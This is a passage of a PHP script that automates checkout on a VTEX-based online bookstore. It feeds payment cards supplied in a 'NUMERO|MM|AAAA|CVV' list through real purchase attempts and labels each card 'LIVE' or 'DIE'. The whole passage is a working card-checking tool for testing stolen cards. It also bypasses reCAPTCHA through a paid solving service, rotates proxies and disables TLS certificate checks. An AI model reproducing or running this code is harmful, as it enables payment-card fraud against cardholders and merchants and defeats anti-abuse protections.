            'expectedOrderFormSections' => $expectedSections,
        ]);
        
        $response = fazerRequest(
            '/api/checkout/pub/orderForm/' . $orderFormId . '/attachments/paymentData',
            'POST',
            $paymentPayload,
            [
                'Content-Type: application/json; charset=UTF-8',
                'Accept: application/json, text/javascript, */*; q=0.01',
                'X-Requested-With: XMLHttpRequest',
            ],
            $cookies,
            'PAYMENT_DATA'
        );
        
        if ($response['status'] !== 200) {
            $msg = "Falha no paymentData: HTTP {$response['status']}";
            debugLog("❌ $msg", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> $msg";
        }
        
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        $paymentResult = json_decode($response['body'], true);
        $recaptchaKey = $paymentResult['recaptchaKey'] ?? $recaptchaKey;
        $totalValue = $paymentResult['value'] ?? $totalValue;
        
        debugLog("✅ OK - PaymentData enviado");
        debugLog("✅ recaptchaKey: $recaptchaKey");
        debugLog("✅ Total final: R$ " . number_format($totalValue / 100, 2, ',', '.'));
        debugLog("✅ PASSO $step concluído em " . (microtime(true)-$start) . "s");
        
        // ========== PASSO 8: RESOLVER CAPTCHA V2 (CapMonster) ==========
        $step++;
        $start = microtime(true);
        debugLog("📌 PASSO $step/$totalSteps: Resolvendo reCAPTCHA V2 com CapMonster");
        
        $recaptchaToken = null;
        
        if (empty($recaptchaKey)) {
            $msg = "Nenhuma chave reCAPTCHA encontrada";
            debugLog("❌ $msg", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> $msg";
        }
        
        debugLog("🔑 Resolvendo reCAPTCHA V2 com key: $recaptchaKey");
        $recaptchaToken = resolverRecaptchaCapmonster($recaptchaKey, BASE_URL . '/checkout/');
        
        if (!$recaptchaToken) {
            $msg = "Falha ao resolver reCAPTCHA V2";
            debugLog("❌ $msg", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> $msg";
        }
        debugLog("✅ reCAPTCHA Token obtido: " . substr($recaptchaToken, 0, 60) . "...");
        debugLog("✅ PASSO $step concluído em " . (microtime(true)-$start) . "s");
        
        // ========== PASSO 9: RENOVAR SESSÃO ANTES DA TRANSAÇÃO ==========
        $step++;
        $start = microtime(true);
        debugLog("📌 PASSO $step/$totalSteps: Renovando sessão antes da transação");
        
        $response = fazerRequest(
            '/api/sessions',
            'PATCH',
            '{}',
            ['Content-Type: application/json', 'X-Requested-With: XMLHttpRequest'],
            $cookies,
            'PATCH_SESSIONS_BEFORE_TRANSACTION'
        );
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        
        $sessionData = json_decode($response['body'], true);
        if (!empty($sessionData['sessionToken'])) {
            $cookies['vtex_session'] = $sessionData['sessionToken'];
        }
        if (!empty($sessionData['segmentToken'])) {
            $cookies['vtex_segment'] = $sessionData['segmentToken'];
        }
        debugLog("✅ Sessão renovada, novos tokens obtidos");
        logCookies($cookies, '🍪 Cookies após renovação');
        debugLog("✅ PASSO $step concluído em " . (microtime(true)-$start) . "s");
        
        // ========== PASSO 10: POST /transaction ==========
        $step++;
        $start = microtime(true);
        debugLog("📌 PASSO $step/$totalSteps: Criando transação");
        
        $transactionPayload = json_encode([
            'referenceId' => $orderFormId,
            'savePersonalData' => true,
            'optinNewsLetter' => false,
            'value' => $totalValue,
            'referenceValue' => $totalValue,
            'interestValue' => 0,
            'expectedOrderFormSections' => $expectedSections,
            'recaptchaKey' => $recaptchaKey,
            'recaptchaToken' => $recaptchaToken,
            'userProfileId' => $userProfileId,
        ]);
        
        debugLog("📦 Transaction Payload: " . $transactionPayload);
        
        // Garantir que os cookies de autenticação estejam presentes
        if (!isset($cookies['VtexIdclientAutCookie_' . ACCOUNT_NAME]) || !isset($cookies['VtexIdclientAutCookie_' . ACCOUNT_ID])) {
            debugLog("⚠️ Cookies de autenticação faltando! Tentando recuperar da sessão...", null, 'WARN');
            $sessionCookies = $_SESSION['cookies_umlivro'] ?? [];
            if (!isset($cookies['VtexIdclientAutCookie_' . ACCOUNT_NAME]) && isset($sessionCookies['VtexIdclientAutCookie_' . ACCOUNT_NAME])) {
                $cookies['VtexIdclientAutCookie_' . ACCOUNT_NAME] = $sessionCookies['VtexIdclientAutCookie_' . ACCOUNT_NAME];
            }
            if (!isset($cookies['VtexIdclientAutCookie_' . ACCOUNT_ID]) && isset($sessionCookies['VtexIdclientAutCookie_' . ACCOUNT_ID])) {
                $cookies['VtexIdclientAutCookie_' . ACCOUNT_ID] = $sessionCookies['VtexIdclientAutCookie_' . ACCOUNT_ID];
            }
            logCookies($cookies, '🍪 Cookies após recuperação');
        }
        
        $response = fazerRequest(
            '/api/checkout/pub/orderForm/' . $orderFormId . '/transaction',
            'POST',
            $transactionPayload,
            [
                'Content-Type: application/json; charset=UTF-8',
                'Accept: application/json, text/javascript, */*; q=0.01',
                'X-Requested-With: XMLHttpRequest',
                'Origin: ' . BASE_URL,
                'Referer: ' . BASE_URL . '/checkout/',
            ],
            $cookies,
            'TRANSACTION'
        );
        
        if ($response['status'] !== 200) {
            $errorMsg = 'Transação falhou: HTTP ' . $response['status'];
            if (preg_match('/x-vtex-error-message:\s*([^\r\n]+)/i', $response['headers'], $matches)) {
                $errorMsg = urldecode(trim($matches[1]));
            }
            
            $responseBody = json_decode($response['body'], true);
            if (!empty($responseBody['messages'][0]['text'])) {
                $errorMsg = $responseBody['messages'][0]['text'];
            }
            
            $returnCode = extrairReturnCode($errorMsg);
            debugLog("❌ ERRO transaction: $errorMsg", null, 'ERROR');
            debugLog("❌ PASSO $step falhou em " . (microtime(true)-$start) . "s", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [$returnCode] ~> $errorMsg";
        }
        
        $cookies = mesclarCookies($cookies, extrairCookies($response['headers']));
        $transactionResult = json_decode($response['body'], true);
        $transactionId = $transactionResult['id'] ?? null;
        $orderGroup = $transactionResult['orderGroup'] ?? null;
        
        debugLog("✅ Transaction ID: $transactionId");
        debugLog("✅ OrderGroup: $orderGroup");
        debugLog("✅ PASSO $step concluído em " . (microtime(true)-$start) . "s");
        
        if (empty($transactionId) || empty($orderGroup)) {
            $responseBody = json_decode($response['body'], true);
            if (!empty($responseBody['messages'][0]['text'])) {
                $errorMsg = $responseBody['messages'][0]['text'];
                $returnCode = extrairReturnCode($errorMsg);
                debugLog("❌ Dados da transação incompletos: $errorMsg", null, 'ERROR');
                return "❌ DIE ~> $cartaoRaw ~> Codigo: [$returnCode] ~> $errorMsg";
            }
            
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> Dados da transação incompletos";
        }
        
        // ========== PASSO 11: VTEX Payments ==========
        $step++;
        $start = microtime(true);
        debugLog("📌 PASSO $step/$totalSteps: Enviando para VTEX Payments");
        
        $sessionId = $cookies['VtexRCSessionIdv7'] ?? gerarUUID();
        $macId = $cookies['VtexRCMacIdv7'] ?? gerarUUID();
        $userProfileId = $cookies['userProfileId'] ?? $userProfileId;
        $deviceInfo = 'c3c9MTkyMCZzaD0xMDgwJmNkPTI0JnR6PTE4MCZsYW5nPXB0LUJSJmphdmE9ZmFsc2Umc291cmNlQXBwbGljYXRpb249dmNzLmNoZWNrb3V0LXVpQHY2LjE1MS4zJmluc3RhbGxlZEFwcGxpY2F0aW9ucz1bInBpeC1wYXltZW50Il0=';
        
        $queryParams = http_build_query([
            'orderId' => $orderGroup,
            'userProfileId' => $userProfileId,
            'redirect' => 'false',
            'callbackUrl' => BASE_URL . "/checkout/gatewayCallback/{$orderGroup}/{messageCode}",
            'macId' => $macId,
            'sessionId' => $sessionId,
            'deviceInfo' => $deviceInfo,
        ]);
        
        $paymentDataArray = [[
            'hasDefaultBillingAddress' => true,
            'isLuhnValid' => true,
            'installmentsInterestRate' => 0,
            'referenceValue' => $totalValue,
            'bin' => $cardData['bin'],
            'accountId' => null,
            'value' => $totalValue,
            'tokenId' => null,
            'paymentSystem' => '4',
            'isBillingAddressDifferent' => false,
            'fields' => [
                'holderName' => $cardData['holderName'],
                'cardNumber' => $cardData['cardNumber'],
                'validationCode' => $cardData['validationCode'],
                'dueDate' => $cardData['dueDate'],
                'document' => $cardData['document'] ?? null,
                'addressId' => $addressId ?? '5357681590005',
                'bin' => $cardData['bin'],
            ],
            'installments' => 1,
            'chooseToUseNewCard' => true,
            'isRegexValid' => true,
            'id' => strtoupper(ACCOUNT_NAME),
            'interestRate' => 0,
            'installmentValue' => $totalValue,
            'transaction' => [
                'id' => $transactionId,
                'merchantName' => strtoupper(ACCOUNT_NAME)
            ],
            'installmentsValue' => $totalValue,
            'currencyCode' => 'BRL',
            'originalPaymentIndex' => 0,
            'groupName' => 'creditCardPaymentGroup'
        ]];
        
        $jsonBody = json_encode($paymentDataArray);
        $url = "https://" . ACCOUNT_NAME . ".vtexpayments.com.br/api/pub/transactions/{$transactionId}/payments?{$queryParams}";
        
        debugLog("🔗 URL VTEX Payments: " . substr($url, 0, 300) . "...");
        
        $ch = curl_init($url);
        
        global $proxyConfig;
        if (!empty($proxyConfig)) {
            $ch = configureCurlWithProxy($ch, $proxyConfig);
        }
        
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $jsonBody,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TIMEOUT => 60,
            CURLOPT_ENCODING => 'gzip, deflate',
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json;charset=UTF-8',
                'Accept: application/json, text/plain, */*',
                'Origin: https://io.vtexpayments.com.br',
                'Referer: https://io.vtexpayments.com.br/',
                'User-Agent: ' . USER_AGENT,
            ],
            CURLOPT_HEADER => true,
        ]);
        
        $vtexResponse = curl_exec($ch);
        $vtexError = curl_error($ch);
        $vtexHeaderSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $vtexHttpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($vtexError) {
            $msg = "Erro VTEX Payments: $vtexError";
            debugLog("❌ $msg", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> $msg";
        }
        
        debugLog("📥 VTEX Payments Response Status: $vtexHttpCode");
        debugLog("✅ PASSO $step concluído em " . (microtime(true)-$start) . "s");
        
        if ($vtexHttpCode !== 201) {
            $msg = "VTEX Payments falhou: HTTP $vtexHttpCode";
            debugLog("❌ $msg", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> $msg";
        }
        
        debugLog("✅ OK - VTEX Payments enviado (HTTP 201)");
        
        // ========== PASSO 12: Gateway Callback ==========
        $step++;
        $start = microtime(true);
        debugLog("📌 PASSO $step/$totalSteps: Gateway Callback");
        
        $response = fazerRequest(
            '/api/checkout/pub/gatewayCallback/' . $orderGroup,
            'POST',
            null,
            [
                'Content-Type: application/json; charset=UTF-8',
                'Origin: ' . BASE_URL,
                'Referer: ' . BASE_URL . '/checkout/',
                'X-Requested-With: XMLHttpRequest',
            ],
            $cookies,
            'GATEWAY_CALLBACK'
        );
        
        if ($response['status'] !== 200 && $response['status'] !== 204) {
            $errorMsg = 'Callback falhou: HTTP ' . $response['status'];
            if (preg_match('/x-vtex-error-message:\s*([^\r\n]+)/i', $response['headers'], $matches)) {
                $errorMsg = urldecode(trim($matches[1]));
            }
            
            $returnCode = extrairReturnCode($errorMsg);
            debugLog("❌ ERRO callback: $errorMsg", null, 'ERROR');
            debugLog("❌ PASSO $step falhou em " . (microtime(true)-$start) . "s", null, 'ERROR');
            return "❌ DIE ~> $cartaoRaw ~> Codigo: [$returnCode] ~> $errorMsg";
        }
        
        debugLog("✅ Callback processado com sucesso! (HTTP {$response['status']})");
        debugLog("✅ PASSO $step concluído em " . (microtime(true)-$start) . "s");
        
        // ========== SUCESSO ==========
        $totalTime = microtime(true) - $startTotal;
        debugLog("🏁 CHECKOUT FINALIZADO COM SUCESSO em {$totalTime}s", [
            'transactionId' => $transactionId,
            'orderGroup' => $orderGroup,
            'valor' => $totalValue
        ], 'INFO');
        
        return "✅ LIVE ~> $cartaoRaw ~> Codigo: [0000] ~> Pedido finalizado com sucesso! (LIVE NAO 100%)";
        
    } catch (Exception $e) {
        debugLog("💥 EXCEÇÃO NO CHECKOUT", [
            'message' => $e->getMessage(),
            'file' => $e->getFile(),
            'line' => $e->getLine(),
            'trace' => $e->getTraceAsString()
        ], 'ERROR');
        return "❌ DIE ~> $cartaoRaw ~> Codigo: [ERR] ~> Erro: " . $e->getMessage();
    }
}

// =====================================================
// RUN CHECKOUT (saída pura)
// =====================================================
function runCheckout($inputJson) {
    global $proxyConfig;
    
    ob_start();
    debugLog("=== RUN_CHECKOUT UMLIVRO ===");
    debugLog("📥 Input recebido", $inputJson);
    
    $proxyConfig = getProxyConfig();
    if ($proxyConfig) {
        debugLog("🌐 Proxy recebido: {$proxyConfig['host']}:{$proxyConfig['port']}");
    }
    
    if (!sessaoEstaAtiva()) {
        echo "❌ Sessão expirada. Faça login primeiro.\n";
        exit;
    }
    
    $cookies = $_SESSION['cookies_umlivro'] ?? [];
    if (empty($cookies)) {
        echo "❌ Sessão inválida.\n";
        exit;
    }
    logCookies($cookies, '🍪 Cookies da sessão');
    
    $cartaoInput = $inputJson['cartao'] ?? $_GET['lista'] ?? '';
    $holderName = $inputJson['holderName'] ?? CLIENT_FIRST_NAME . ' ' . CLIENT_LAST_NAME;
    $document = $inputJson['document'] ?? CLIENT_DOCUMENT;
    $productUrl = $inputJson['product_url'] ?? $_GET['product_url'] ?? '/geopoetica-da-lama--do-lamacal-a-um-olhar-de-insurgencia-8494074/p';
    
    $cardData = [];
    
    if (!empty($cartaoInput) && strpos($cartaoInput, '|') !== false) {
        $parts = explode('|', $cartaoInput);
        if (count($parts) === 4) {
            $cardNumber = trim($parts[0]);
            $month = trim($parts[1]);
            $year = trim($parts[2]);
            $cvv = trim($parts[3]);
            if (strlen($year) === 4) $year = substr($year, -2);
            
            $cardData = [
                'holderName' => $holderName,
                'cardNumber' => $cardNumber,
                'validationCode' => $cvv,
                'dueDate' => $month . '/' . $year,
                'document' => preg_replace('/[^0-9]/', '', $document),
                'bin' => substr($cardNumber, 0, 8),
                'deviceFingerprint' => gerarDeviceFingerprint($cardNumber)
            ];
        }
    }
    
    if (empty($cardData)) {
        debugLog("❌ CARTÃO NÃO ENVIADO!", null, 'ERROR');
        echo "❌ DIE ~> $cartaoInput ~> Codigo: [ERR] ~> Dados do cartão não foram enviados. Use ?lista=NUMERO|MM|AAAA|CVV\n";
        exit;
    }
    
    debugLog("💳 Dados do cartão:", [
        'holderName' => $cardData['holderName'],
        'cardNumber' => substr($cardData['cardNumber'], 0, 4) . '****' . substr($cardData['cardNumber'], -4),
        'dueDate' => $cardData['dueDate'],
        'bin' => $cardData['bin']
    ]);
    
    $resultado = executarCheckoutCompleto($cookies, $cardData, $productUrl, $cartaoInput);
    echo $resultado . "\n";
    exit;
}

// =====================================================
// ORQUESTRADOR PRINCIPAL – SAÍDA PURA
// =====================================================

debugLog("🚀 SCRIPT INICIADO", [
    'GET' => $_GET,
    'POST' => $_POST,
    'INPUT' => file_get_contents('php://input'),
    'SERVER' => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
    'SESSION_ID' => session_id()
], 'INFO');

$inputRaw = file_get_contents('php://input');
$inputJson = json_decode($inputRaw, true);

$action = $_POST['action'] ?? $_GET['action'] ?? ($inputJson['action'] ?? '');

$proxyConfig = getProxyConfig();
if ($proxyConfig) {
    debugLog("🌐 Proxy global configurado: {$proxyConfig['host']}:{$proxyConfig['port']}");
}

if ($action === 'login') {
    doLogin();
    exit;
}

if ($action === 'check_session') {
    if (sessaoEstaAtiva()) {
        echo "✅ Sessão ativa\n";
        echo "Usuário: " . ($_SESSION['user_name_umlivro'] ?? 'N/A') . "\n";
        echo "Email: " . ($_SESSION['user_email_umlivro'] ?? 'N/A') . "\n";
        echo "userProfileId: " . ($_SESSION['userProfileId'] ?? 'N/A') . "\n";
    } else {
        echo "❌ Sessão expirada\n";
    }
    exit;
}

if ($action === 'logout') {
    session_destroy();
    echo "✅ Sessão finalizada\n";
    exit;
}

if (!empty($_GET['lista']) || !empty($_POST['lista'])) {
    $inputJson['cartao'] = $_GET['lista'] ?? $_POST['lista'] ?? '';
    runCheckout($inputJson);
    exit;
}

echo "❌ Ação inválida. Use:\n";
echo "  ?action=login               – para fazer login\n";
echo "  ?lista=NUMERO|MES|ANO|CVV   – para executar checkout\n";
echo "  ?action=check_session       – verifica sessão\n";
echo "  ?action=logout              – encerra sessão\n";
exit;